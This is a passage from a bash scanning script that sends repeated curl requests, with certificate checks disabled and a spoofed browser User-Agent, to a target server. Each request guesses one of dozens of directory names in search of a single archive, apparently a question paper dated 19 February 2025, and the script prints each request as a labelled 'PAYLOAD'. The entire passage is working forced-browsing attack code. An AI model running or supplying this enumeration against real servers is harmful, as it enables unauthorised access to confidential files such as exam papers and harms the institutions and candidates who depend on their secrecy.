code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager_DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager_DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUploadQPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUploadQPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUploadQPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandlerSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandlerSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandlerSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystemMassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystemMassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystemMassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase-MassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase-MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase-MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP_Handler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP_Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP_Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [OpsQPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}OpsQPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}OpsQPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P_Module/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P_Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P_Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor_DataPipeline/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor_DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor_DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper_DataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper_DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper_DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase-Portal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase-Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase-Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper_Tool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper_Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper_Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation_QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMasterDataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMasterDataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMasterDataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUploadQPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUploadQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUploadQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Uploader_QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Uploader_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Uploader_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [System_QPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}System_QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}System_QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Monitoring_QPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Monitoring_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Monitoring_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Monitoring-QPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Monitoring-QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Monitoring-QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [System-QPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}System-QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}System-QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ToolTestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ToolTestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ToolTestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P-AutomationSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P-AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P-AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Processing-QPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Processing-QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Processing-QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystemQPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystemQPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystemQPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService-BatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService-BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService-BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUpload_QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUpload_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUpload_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringQPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringQPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringQPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload_Sync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload_Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload_Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc_Manager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc_Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc_Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControl_QPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControl_QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControl_QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase_FileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase_FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase_FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper_Management/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper_Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper_Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TransferQPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TransferQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TransferQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService-AccessControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService-AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService-AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster-HandlingModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster-HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster-HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler_FileProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler_FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler_FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl-AutoUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl-AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl-AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Module-QPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Module-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Module-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper_BatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper_BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
